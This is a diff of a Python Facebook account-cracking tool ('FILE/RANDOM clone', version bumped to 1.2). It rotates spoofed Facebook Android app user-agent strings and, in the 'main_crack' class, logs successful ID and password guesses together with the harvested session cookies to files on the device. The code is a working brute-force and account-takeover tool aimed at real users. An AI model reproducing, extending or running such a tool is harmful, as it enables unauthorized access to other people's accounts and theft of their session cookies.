@@ -62,7 +62,7 @@ filter = []
 def randBuildLSB():
     vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
     VAPP = random.randint(410000000,499999999)
-    END = 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/367.0.0.7.52;]'
+    END = '[FBAN/FB4A;FBAV/4020.1.80.24.874;FBBV/4214899694;FBDM/{density=2.5,width=780,height=1920};FBLC/fr_IN;FBRV/4214899694;FBCR/1030;FBMF/Realme;FBBD/Ostin;FBPN/com.facebook.katana;FBDV/Ostin Realme 5;FBSV/16;FBOP/5;FBCA/arm64-v8a:;]'
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
 
@@ -76,7 +76,7 @@ def RPm1():
 #_______m2________
 
 def randBuildvsskj():
-    END = '[FBAN/FB4A;FBAV/355.0.0.37.106;FBPN/com.facebook.katana;FBLC/in_ID;FBBV/13543083;FBCR/Telenor;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2325;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1520};FB_FW/1;]'
+    END = '[FBAN/EMA;FBBV/352223683;FBAV/291.0.0.12.110;FBDV/SM-G935ES;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]'
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
 
@@ -102,7 +102,7 @@ logo ="""\033[1;37m
 \033[1;32m--------------------------------------------------------
 \033[1;37m[\033[1;31m•\033[1;37m]\033[1;31m  DEVELOPER    :   \033[1;31mPARVEZ AHMED
 \033[1;37m[\033[1;32m•\033[1;37m]\033[1;32m  TOOLS        :   \033[1;32mFILE/RANDOM clone
-\033[1;37m[\033[1;33m•\033[1;37m]\033[1;33m  VERSION      :   \033[1;33m1.0
+\033[1;37m[\033[1;33m•\033[1;37m]\033[1;33m  VERSION      :   \033[1;33m1.2
 \033[1;37m[\033[1;34m•\033[1;37m]\033[1;34m  WORKING      :   \033[1;34mDATA/WIFI
 \033[1;37m[\033[1;35m•\033[1;37m]\033[1;35m  WHATSAPP     :   \033[1;35m8801751581953
 \033[1;32m------------------------------------------------------"""
@@ -425,7 +425,7 @@ class main_crack():
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                     print(f"\r\033[1;32m [RP]-[OK] {sid} | {ps} {S}")
-                    print("\r\r\033[1;34m[❤️‍🩹\033[1;34m]\033[1;32m :\033[1;37m "+cookie)
+                    print("\r\r\033[1;34m[💥\033[1;34m]\033[1;32m :\033[1;37m "+cookie)
                     oks.append(sid)
                     open('/sdcard/RP/OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RP/iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
